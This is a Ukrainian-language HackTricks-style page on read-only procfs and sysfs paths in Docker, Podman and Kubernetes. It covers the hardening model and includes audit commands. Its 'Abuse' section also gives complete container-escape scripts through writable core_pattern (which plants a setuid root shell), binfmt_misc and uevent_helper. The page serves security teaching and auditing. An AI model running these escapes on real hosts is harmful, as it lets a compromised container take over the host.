# Доступні лише для читання системні шляхи

{{#include ../../../../banners/hacktricks-training.md}}

Системні шляхи, доступні лише для читання, є окремим захистом від замаскованих шляхів. Замість повного приховування шляху runtime відкриває його, але монтує в режимі лише для читання. Це поширено для вибраних розташувань procfs і sysfs, де доступ на читання може бути прийнятним або операційно необхідним, але запис був би надто небезпечним.

Мета проста: багато інтерфейсів ядра стають значно небезпечнішими, коли доступні для запису. Монтування лише для читання не усуває всю розвідувальну цінність, але не дозволяє скомпрометованому workload змінювати файли, що взаємодіють із ядром, через цей шлях.

## Робота

Runtime часто позначає частини представлення proc/sys як доступні лише для читання. Залежно від runtime і host це може включати такі шляхи:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Фактичний список відрізняється, але модель залишається однаковою: дозволити видимість там, де це необхідно, і за замовчуванням заборонити зміни.

## Лабораторна робота

Перегляньте список шляхів, доступних лише для читання, оголошений Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Перевірте змонтоване представлення proc/sys зсередини контейнера:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Вплив на безпеку

Шляхи системи, доступні лише для читання, обмежують широкий клас зловживань, що можуть впливати на host. Навіть якщо attacker може перевіряти procfs або sysfs, неможливість запису в них усуває багато прямих шляхів модифікації, пов’язаних із kernel tunables, crash handlers, module-loading helpers та іншими інтерфейсами керування. Ризик не зникає, але перехід від розкриття інформації до впливу на host стає складнішим.

## Неправильні конфігурації

Основні помилки полягають у знятті маскування або повторному монтуванні чутливих шляхів у режимі read-write, безпосередньому відкритті вмісту host proc/sys через доступні для запису bind mounts або використанні привілейованих режимів, які фактично обходять безпечніші runtime defaults. У Kubernetes `procMount: Unmasked` і privileged workloads часто поєднуються зі слабшим захистом proc. Ще одна поширена операційна помилка — припущення, що оскільки runtime зазвичай монтує ці шляхи лише для читання, усі workloads і надалі успадковують це default-налаштування.

## Зловживання

Якщо захист слабкий, почніть із пошуку доступних для запису записів proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Коли наявні записи, доступні для запису, цінні подальші шляхи включають:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Що можуть виявити ці команди:

- Записи, доступні для запису, у `/proc/sys` часто означають, що контейнер може змінювати поведінку kernel хоста, а не лише перевіряти її.
- `core_pattern` особливо важливий, оскільки доступне для запису значення, що стосується хоста, можна перетворити на шлях до виконання коду на хості, аварійно завершивши процес після налаштування pipe handler.
- `modprobe` показує helper, який kernel використовує для потоків, пов’язаних із завантаженням модулів; це класична ціль високої цінності, якщо вона доступна для запису.
- `binfmt_misc` показує, чи можлива реєстрація custom interpreter. Якщо реєстрація доступна для запису, це може стати execution primitive, а не просто information leak.
- `panic_on_oom` керує загальносистемним рішенням kernel на хості й тому може перетворити вичерпання ресурсів на denial of service хоста.
- `uevent_helper` є одним із найочевидніших прикладів того, як доступний для запису шлях до sysfs helper призводить до виконання в контексті хоста.

Цікаві результати включають доступні для запису proc knobs або записи sysfs, що стосуються хоста й зазвичай мають бути доступними лише для читання. На цьому етапі workload переходить від обмеженого представлення контейнера до суттєвого впливу на kernel.

### Повний приклад: `core_pattern` Host Escape

Якщо `/proc/sys/kernel/core_pattern` доступний для запису з контейнера й вказує на представлення kernel хоста, його можна використати для виконання payload після crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Якщо шлях справді досягає kernel хоста, payload виконується на хості й залишає після себе setuid shell.

### Повний приклад: `binfmt_misc` Registration

Якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису, реєстрація custom interpreter може спричинити code execution під час виконання відповідного файлу:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
У доступному для хоста записуваному `binfmt_misc` результатом є виконання коду через шлях інтерпретатора, запуск якого ініціює ядро.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, ядро може викликати helper за шляхом на хості, коли спрацьовує відповідна подія:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Причина, чому це настільки небезпечно, полягає в тому, що шлях helper визначається з погляду файлової системи host, а не в безпечному контексті, обмеженому container.

## Перевірки

Ці перевірки визначають, чи доступ до procfs/sysfs є read-only там, де це очікується, і чи може workload і надалі змінювати чутливі інтерфейси kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Що тут цікавого:

- Звичайний hardened workload має відкривати дуже мало доступних для запису записів у proc/sys.
- Доступні для запису шляхи `/proc/sys` часто важливіші за звичайний доступ на читання.
- Якщо runtime вказує, що шлях доступний лише для читання, але на практиці він доступний для запису, уважно перевірте mount propagation, bind mounts і налаштування привілеїв.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker визначає список шляхів лише для читання за замовчуванням для чутливих записів proc | exposing host proc/sys mounts, `--privileged` |
| Podman | Enabled by default | Podman застосовує стандартні шляхи лише для читання, якщо їх явно не послаблено | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inherits runtime defaults | Використовує модель шляхів лише для читання базового runtime, якщо її не послаблено через налаштування Pod або host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | Зазвичай покладається на стандартні налаштування OCI/runtime | те саме, що й у рядку Kubernetes; прямі зміни конфігурації runtime можуть послабити цю поведінку |

Ключовий момент полягає в тому, що системні шляхи лише для читання зазвичай присутні як стандартне налаштування runtime, але їх легко обійти за допомогою privileged modes або host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
